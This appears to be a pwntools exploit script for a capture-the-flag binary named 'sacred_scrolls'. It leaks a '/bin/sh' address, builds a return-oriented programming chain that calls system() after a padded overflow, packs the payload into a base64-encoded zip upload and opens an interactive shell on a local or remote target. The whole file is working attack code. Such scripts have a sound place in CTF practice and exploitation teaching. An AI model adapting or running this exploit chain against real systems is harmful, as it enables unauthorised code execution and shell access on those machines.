#!/usr/bin/env python3

from pwn import *

context.binary = 'sacred_scrolls'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def main():
    p = get_process()

    p.sendafter(b'Enter your wizard tag: ', b'A' * 16)
    p.recvuntil(b'A' * 16)
    bin_sh_addr = u64(p.recvline().strip().ljust(8, b'\0'))
    log.info(f'"/bin/sh" address: {hex(bin_sh_addr)}')

    pop_rdi_ret = 0x401183
    system_plt = 0x400820

    payload  = b'\xf0\x9f\x91\x93\xe2\x9a\xa1'
    payload += b'A' * 33
    payload += p64(pop_rdi_ret)
    payload += p64(bin_sh_addr)
    payload += p64(pop_rdi_ret + 1)
    payload += p64(system_plt)

    with open('spell.txt', 'wb') as f:
        f.write(payload)

    os.system('zip spell.zip spell.txt')
    os.system('rm spell.txt')

    with open('spell.zip', 'rb') as f:
        b64_payload = b64e(f.read()).encode()

    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'Enter file (it will be named spell.zip): ', b64_payload)

    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'>> ', b'3')
    p.interactive()


if __name__ == '__main__':
    main()
